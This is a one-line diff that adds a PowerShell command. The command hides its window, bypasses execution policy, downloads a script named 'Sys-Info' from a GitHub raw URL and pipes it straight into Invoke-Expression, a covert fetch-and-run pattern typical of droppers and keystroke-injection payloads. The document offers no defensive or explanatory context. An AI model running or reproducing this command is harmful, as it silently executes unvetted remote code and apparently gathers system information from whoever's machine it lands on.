@@ -1,0 +1,1 @@
+powershell -w h -NoP -NonI -Exec Bypass irm https://raw.githubusercontent.com/dyl4nz/Functions/main/powershell/Sys-Info/function | iex
